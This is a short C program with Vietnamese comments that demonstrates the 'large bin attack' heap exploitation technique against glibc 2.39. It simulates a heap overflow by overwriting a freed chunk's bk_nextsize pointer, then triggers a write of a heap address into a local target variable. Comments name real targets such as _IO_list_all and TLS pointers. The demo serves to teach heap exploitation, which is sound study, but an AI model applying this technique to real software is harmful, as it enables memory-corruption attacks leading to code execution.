#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    printf("--- Large Bin Attack Demo (glibc 2.39) ---\n");

    // 1. Khởi tạo một biến mục tiêu (target)
    // Trong thực tế, đây có thể là con trỏ TLS, mp_, hoặc _IO_list_all
    unsigned long target = 0;
    printf("Target truoc khi tan cong: %p (Gia tri: 0x%lx)\n", &target, target);

    // 2. Allocate 2 chunk lon để đưa vào Large Bin
    // Phải lớn hơn 0x400 để rơi vào Large Bin
    void *p1 = malloc(0x420); 
    malloc(0x20); // Chunk ngan cach de p1 khong gop vao Top chunk
    
    void *p2 = malloc(0x410); 
    malloc(0x20); // Chunk ngan cach de p2 khong gop vao Top chunk

    // 3. Dua p1 vao Large Bin
    free(p1);
    // Malloc mot size lon hon p1 de p1 tu Unsorted Bin bi day vao Large Bin
    malloc(0x500); 

    // 4. Dua p2 vao Unsorted Bin
    free(p2);

    // 5. GIẢ LẬP LỖ HỔNG (Heap Overflow/UAF)
    // Ta se sua p1->bk_nextsize de tro toi (target - 0x20)
    // Trong struct malloc_chunk:
    // fd = offset 0, bk = offset 8, fd_nextsize = offset 16, bk_nextsize = offset 24
    uint64_t *p1_ptr = (uint64_t *)((uint64_t)p1);
    p1_ptr[3] = (uint64_t)(&target) - 0x20; 

    printf("Dang thuc hien ghi de p1->bk_nextsize thanh %p\n", (void*)p1_ptr[3]);

    // 6. KICH HOAT: Malloc mot size nho hon p2
    // He thong se duyet Unsorted Bin, thay p2 va co gang dua p2 vao Large Bin sau p1
    malloc(0x400);

    // 7. KET QUA
    printf("Target sau khi tan cong: 0x%lx\n", target);
    printf("Gia tri nay chinh la dia chi cua p2 (vua duoc chèn vao Large Bin)\n");

    return 0;
}